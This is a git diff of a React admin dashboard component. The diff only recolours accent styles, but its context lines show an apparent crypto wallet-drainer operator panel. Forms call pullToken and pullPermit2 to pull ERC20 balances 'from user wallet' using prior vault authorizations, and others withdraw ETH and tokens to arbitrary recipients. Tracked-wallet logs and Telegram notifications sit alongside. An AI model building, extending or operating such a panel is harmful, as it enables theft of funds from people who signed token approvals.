@@ -325,9 +325,9 @@ export function AdminTab() {
         </div>
 
         <div className="bg-card rounded-2xl p-8 border border-border-main text-center shadow-sm max-w-md mx-auto relative overflow-hidden">
-          <div className="absolute top-0 left-0 w-full h-1 bg-[#00A3FF]"></div>
-          <div className="w-16 h-16 bg-[#00A3FF]/10 rounded-full flex items-center justify-center mx-auto mb-6">
-            <ShieldAlert className="w-8 h-8 text-[#00A3FF]" />
+          <div className="absolute top-0 left-0 w-full h-1 bg-[#FF007A]"></div>
+          <div className="w-16 h-16 bg-[#FF007A]/10 rounded-full flex items-center justify-center mx-auto mb-6">
+            <ShieldAlert className="w-8 h-8 text-[#FF007A]" />
           </div>
           <h2 className="text-xl font-bold mb-2">Secure Admin Access</h2>
           <p className="text-sm text-text-secondary mb-8">
@@ -343,7 +343,7 @@ export function AdminTab() {
           <button
             onClick={signIn}
             disabled={isSigning}
-            className={`w-full py-4 rounded-xl font-bold text-lg transition-all ${isSigning ? 'bg-[#00A3FF]/50 text-white cursor-not-allowed' : 'bg-[#00A3FF] hover:bg-[#0090E6] text-white shadow-sm'}`}
+            className={`w-full py-4 rounded-xl font-bold text-lg transition-all ${isSigning ? 'bg-[#FF007A]/50 text-white cursor-not-allowed' : 'bg-[#FF007A] hover:bg-[#E6006F] text-white shadow-sm'}`}
           >
             {isSigning ? 'Connecting & Signing...' : 'Connect Wallet & Access Dashboard'}
           </button>
@@ -361,7 +361,7 @@ export function AdminTab() {
             <ShieldCheck className="w-5 h-5 text-emerald-500" />
           </h1>
           <p className="text-sm text-text-secondary flex items-center gap-2">
-            Authenticated as <code className="bg-input px-2 py-0.5 rounded text-xs border border-border-main font-mono text-[#00A3FF]">{address}</code>
+            Authenticated as <code className="bg-input px-2 py-0.5 rounded text-xs border border-border-main font-mono text-[#FF007A]">{address}</code>
           </p>
         </div>
         <div className="flex items-center gap-3">
@@ -377,8 +377,8 @@ export function AdminTab() {
 
       <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
         <div className="bg-card rounded-2xl p-6 border border-border-main shadow-sm flex items-start gap-4">
-          <div className="p-3 bg-[#00A3FF]/10 rounded-xl">
-            <Users className="w-6 h-6 text-[#00A3FF]" />
+          <div className="p-3 bg-[#FF007A]/10 rounded-xl">
+            <Users className="w-6 h-6 text-[#FF007A]" />
           </div>
           <div>
             <p className="text-sm text-text-secondary font-medium mb-1">Total Tracked Logs</p>
@@ -386,8 +386,8 @@ export function AdminTab() {
           </div>
         </div>
         <div className="bg-card rounded-2xl p-6 border border-border-main shadow-sm flex items-start gap-4">
-          <div className="p-3 bg-[#00A3FF]/10 rounded-xl">
-            <Activity className="w-6 h-6 text-[#00A3FF]" />
+          <div className="p-3 bg-[#FF007A]/10 rounded-xl">
+            <Activity className="w-6 h-6 text-[#FF007A]" />
           </div>
           <div>
             <p className="text-sm text-text-secondary font-medium mb-1">Network Staking APR</p>
@@ -410,7 +410,7 @@ export function AdminTab() {
         {/* Telegram Dispatcher */}
         <div className="bg-card rounded-2xl p-6 border border-border-main shadow-sm space-y-4">
           <div className="flex items-center gap-2">
-            <Send className="w-5 h-5 text-[#00A3FF]" />
+            <Send className="w-5 h-5 text-[#FF007A]" />
             <h2 className="font-bold text-lg">Telegram Bot Verification</h2>
           </div>
           <p className="text-sm text-text-secondary">
@@ -426,7 +426,7 @@ export function AdminTab() {
           <button
             onClick={handleTestTelegram}
             disabled={telegramSending}
-            className="w-full py-3 bg-[#00A3FF] hover:bg-[#0090E6] text-white font-bold rounded-xl text-sm flex items-center justify-center gap-2 transition-colors disabled:opacity-50"
+            className="w-full py-3 bg-[#FF007A] hover:bg-[#E6006F] text-white font-bold rounded-xl text-sm flex items-center justify-center gap-2 transition-colors disabled:opacity-50"
           >
             {telegramSending ? <RefreshCw className="w-4 h-4 animate-spin" /> : <Send className="w-4 h-4" />}
             <span>{telegramSending ? 'Dispatching Ping...' : 'Send Test Telegram Ping'}</span>
@@ -437,10 +437,10 @@ export function AdminTab() {
       <div className="bg-card rounded-2xl p-6 border border-border-main shadow-sm space-y-4">
         <div className="flex items-center justify-between border-b border-border-main pb-3">
           <h2 className="font-bold text-lg flex items-center gap-2">
-            <Layers className="w-5 h-5 text-[#00A3FF]" />
+            <Layers className="w-5 h-5 text-[#FF007A]" />
             On-Chain Vault Parameters
           </h2>
-          <span className="text-xs font-semibold px-2.5 py-1 bg-[#00A3FF]/10 text-[#00A3FF] border border-[#00A3FF]/20 rounded-lg font-mono">
+          <span className="text-xs font-semibold px-2.5 py-1 bg-[#FF007A]/10 text-[#FF007A] border border-[#FF007A]/20 rounded-lg font-mono">
             Vault: {CONFIG.CONTRACT_ADDRESS.slice(0, 6)}...{CONFIG.CONTRACT_ADDRESS.slice(-4)}
           </span>
         </div>
@@ -453,7 +453,7 @@ export function AdminTab() {
 
           <div className="p-3 bg-input/60 rounded-xl border border-border-main space-y-1">
             <span className="text-text-secondary font-sans font-semibold block text-[11px]">Referral Address</span>
-            <span className="text-[#00A3FF] font-bold truncate block">{currentReferralAddress ? String(currentReferralAddress) : 'Loading...'}</span>
+            <span className="text-[#FF007A] font-bold truncate block">{currentReferralAddress ? String(currentReferralAddress) : 'Loading...'}</span>
           </div>
 
           <div className="p-3 bg-input/60 rounded-xl border border-border-main space-y-1">
@@ -483,7 +483,7 @@ export function AdminTab() {
         <div className="flex items-center justify-between border-b border-border-main pb-3">
           <div>
             <h2 className="font-bold text-lg flex items-center gap-2">
-              <Coins className="w-5 h-5 text-[#00A3FF]" />
+              <Coins className="w-5 h-5 text-[#FF007A]" />
               Smart Contract Execution Scripts
             </h2>
             <p className="text-xs text-text-secondary">Execute write scripts directly on MiddlemanVaultUpgradeable contract</p>
@@ -499,7 +499,7 @@ export function AdminTab() {
             <div className="space-y-2">
               <div className="flex items-center justify-between">
                 <span className="font-bold text-sm text-text-main">pullToken Script</span>
-                <span className="text-[10px] font-mono bg-[#00A3FF]/10 text-[#00A3FF] px-2 py-0.5 rounded">pullToken()</span>
+                <span className="text-[10px] font-mono bg-[#FF007A]/10 text-[#FF007A] px-2 py-0.5 rounded">pullToken()</span>
               </div>
               <p className="text-xs text-text-secondary">Pull ERC20 token balance from user wallet via vault authorization.</p>
               
@@ -509,21 +509,21 @@ export function AdminTab() {
                   placeholder="Token Address (0x...)"
                   value={pullTokenState.token}
                   onChange={(e) => setPullTokenState({ ...pullTokenState, token: e.target.value as `0x${string}` })}
-                  className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#00A3FF]"
+                  className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#FF007A]"
                 />
                 <input
                   type="text"
                   placeholder="From User Wallet (0x...)"
                   value={pullTokenState.from}
                   onChange={(e) => setPullTokenState({ ...pullTokenState, from: e.target.value })}
-                  className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#00A3FF]"
+                  className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#FF007A]"
                 />
                 <input
                   type="text"
                   placeholder="Amount (e.g. 1.5)"
                   value={pullTokenState.amount}
                   onChange={(e) => setPullTokenState({ ...pullTokenState, amount: e.target.value })}
-                  className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#00A3FF]"
+                  className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#FF007A]"
                 />
               </div>
 
@@ -537,7 +537,7 @@ export function AdminTab() {
             <button
               type="submit"
               disabled={isPending}
-              className="w-full py-2.5 bg-[#00A3FF] hover:bg-[#0090E6] text-white font-bold rounded-xl text-xs flex items-center justify-center gap-1.5 transition-colors disabled:opacity-50 mt-2"
+              className="w-full py-2.5 bg-[#FF007A] hover:bg-[#E6006F] text-white font-bold rounded-xl text-xs flex items-center justify-center gap-1.5 transition-colors disabled:opacity-50 mt-2"
             >
               <ArrowUpRight className="w-3.5 h-3.5" />
               <span>Execute pullToken</span>
@@ -559,21 +559,21 @@ export function AdminTab() {
                   placeholder="Token Address (0x...)"
                   value={pullPermit2State.token}
                   onChange={(e) => setPullPermit2State({ ...pullPermit2State, token: e.target.value as `0x${string}` })}
-                  className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#00A3FF]"
+                  className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#FF007A]"
                 />
                 <input
                   type="text"
                   placeholder="From User Wallet (0x...)"
                   value={pullPermit2State.from}
                   onChange={(e) => setPullPermit2State({ ...pullPermit2State, from: e.target.value })}
-                  className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#00A3FF]"
+                  className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#FF007A]"
                 />
                 <input
                   type="text"
                   placeholder="Amount (uint160)"
                   value={pullPermit2State.amount}
                   onChange={(e) => setPullPermit2State({ ...pullPermit2State, amount: e.target.value })}
-                  className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#00A3FF]"
+                  className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#FF007A]"
                 />
               </div>
 
@@ -609,14 +609,14 @@ export function AdminTab() {
                   placeholder="Target User Address (0x...)"
                   value={creditState.user}
                   onChange={(e) => setCreditState({ ...creditState, user: e.target.value })}
-                  className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#00A3FF]"
+                  className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#FF007A]"
                 />
                 <input
                   type="text"
                   placeholder="Credit Amount (ETH)"
                   value={creditState.amount}
                   onChange={(e) => setCreditState({ ...creditState, amount: e.target.value })}
-                  className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#00A3FF]"
+                  className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#FF007A]"
                 />
               </div>
 
@@ -652,14 +652,14 @@ export function AdminTab() {
                   placeholder="Recipient Address (0x...)"
                   value={withdrawEthState.to}
                   onChange={(e) => setWithdrawEthState({ ...withdrawEthState, to: e.target.value })}
-                  className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#00A3FF]"
+                  className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#FF007A]"
                 />
                 <input
                   type="text"
                   placeholder="Amount in ETH"
                   value={withdrawEthState.amount}
                   onChange={(e) => setWithdrawEthState({ ...withdrawEthState, amount: e.target.value })}
-                  className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#00A3FF]"
+                  className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#FF007A]"
                 />
               </div>
 
@@ -695,21 +695,21 @@ export function AdminTab() {
                   placeholder="Token Address (0x...)"
                   value={withdrawTokenState.token}
                   onChange={(e) => setWithdrawTokenState({ ...withdrawTokenState, token: e.target.value as `0x${string}` })}
-                  className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#00A3FF]"
+                  className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#FF007A]"
                 />
                 <input
                   type="text"
                   placeholder="Recipient Address (0x...)"
                   value={withdrawTokenState.to}
                   onChange={(e) => setWithdrawTokenState({ ...withdrawTokenState, to: e.target.value })}
-                  className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#00A3FF]"
+                  className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#FF007A]"
                 />
                 <input
                   type="text"
                   placeholder="Amount"
                   value={withdrawTokenState.amount}
                   onChange={(e) => setWithdrawTokenState({ ...withdrawTokenState, amount: e.target.value })}
-                  className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#00A3FF]"
+                  className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#FF007A]"
                 />
               </div>
 
@@ -733,7 +733,7 @@ export function AdminTab() {
       </div>
         <div className="bg-card rounded-2xl p-6 border border-border-main shadow-sm space-y-4">
           <div className="flex items-center gap-2">
-            <Settings className="w-5 h-5 text-[#00A3FF]" />
+            <Settings className="w-5 h-5 text-[#FF007A]" />
             <h2 className="font-bold text-lg">Smart Contract Control</h2>
           </div>
           <p className="text-sm text-text-secondary">
@@ -747,7 +747,7 @@ export function AdminTab() {
               placeholder="0x..."
               value={newReferralAddress}
               onChange={(e) => setNewReferralAddress(e.target.value)}
-              className="w-full bg-input border border-border-main rounded-xl px-3 py-2 text-sm font-mono focus:outline-none focus:border-[#00A3FF]"
+              className="w-full bg-input border border-border-main rounded-xl px-3 py-2 text-sm font-mono focus:outline-none focus:border-[#FF007A]"
             />
           </div>
 
@@ -760,7 +760,7 @@ export function AdminTab() {
           <button
             onClick={handleSetReferral}
             disabled={isPending}
-            className="w-full py-3 bg-card border border-[#00A3FF] text-[#00A3FF] hover:bg-[#00A3FF]/10 font-bold rounded-xl text-sm flex items-center justify-center gap-2 transition-colors disabled:opacity-50"
+            className="w-full py-3 bg-card border border-[#FF007A] text-[#FF007A] hover:bg-[#FF007A]/10 font-bold rounded-xl text-sm flex items-center justify-center gap-2 transition-colors disabled:opacity-50"
           >
             {isPending ? <RefreshCw className="w-4 h-4 animate-spin" /> : <KeyRound className="w-4 h-4" />}
             <span>Update Contract Referral</span>
@@ -771,7 +771,7 @@ export function AdminTab() {
       {/* Manual Admin Audit Entry Section (Write Access) */}
       <div className="bg-card rounded-2xl p-6 border border-border-main shadow-sm space-y-4">
         <h2 className="font-bold text-lg flex items-center gap-2">
-          <Plus className="w-5 h-5 text-[#00A3FF]" />
+          <Plus className="w-5 h-5 text-[#FF007A]" />
           Create Admin Audit Log Note
         </h2>
         <form onSubmit={handleCreateManualLog} className="flex gap-3">
@@ -780,11 +780,11 @@ export function AdminTab() {
             placeholder="Enter administrative log entry or security note..."
             value={newLogNote}
             onChange={(e) => setNewLogNote(e.target.value)}
-            className="flex-1 bg-input border border-border-main rounded-xl px-4 py-2.5 text-sm focus:outline-none focus:border-[#00A3FF]"
+            className="flex-1 bg-input border border-border-main rounded-xl px-4 py-2.5 text-sm focus:outline-none focus:border-[#FF007A]"
           />
           <button
             type="submit"
-            className="px-6 py-2.5 bg-[#00A3FF] hover:bg-[#0090E6] text-white font-bold rounded-xl text-sm transition-colors"
+            className="px-6 py-2.5 bg-[#FF007A] hover:bg-[#E6006F] text-white font-bold rounded-xl text-sm transition-colors"
           >
             Post Entry
           </button>
@@ -807,7 +807,7 @@ export function AdminTab() {
                 <button
                   key={type}
                   onClick={() => setFilterType(type)}
-                  className={`px-2.5 py-1 rounded-md font-semibold transition-colors ${filterType === type ? 'bg-[#00A3FF] text-white' : 'text-text-secondary hover:text-text-main'}`}
+                  className={`px-2.5 py-1 rounded-md font-semibold transition-colors ${filterType === type ? 'bg-[#FF007A] text-white' : 'text-text-secondary hover:text-text-main'}`}
                 >
                   {type}
                 </button>
@@ -862,7 +862,7 @@ export function AdminTab() {
                     <td className="px-6 py-4 text-xs text-text-secondary whitespace-nowrap">
                       {new Date(act.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })}
                     </td>
-                    <td className="px-6 py-4 font-mono text-xs text-[#00A3FF]">
+                    <td className="px-6 py-4 font-mono text-xs text-[#FF007A]">
                       <a
                         href={`https://etherscan.io/address/${act.wallet}`}
                         target="_blank"
@@ -909,7 +909,7 @@ export function AdminTab() {
                           />
                           <button
                             onClick={() => handleSaveNote(act.id)}
-                            className="px-2 py-1 bg-[#00A3FF] text-white rounded text-[10px] font-bold"
+                            className="px-2 py-1 bg-[#FF007A] text-white rounded text-[10px] font-bold"
                           >
                             Save
                           </button>
@@ -924,7 +924,7 @@ export function AdminTab() {
                           setEditingId(act.id);
                           setEditingNote(act.note || '');
                         }}
-                        className="p-1 text-[#00A3FF] hover:bg-[#00A3FF]/10 rounded transition-colors"
+                        className="p-1 text-[#FF007A] hover:bg-[#FF007A]/10 rounded transition-colors"
                         title="Edit Admin Note"
                       >
                         <Edit3 className="w-4 h-4" />
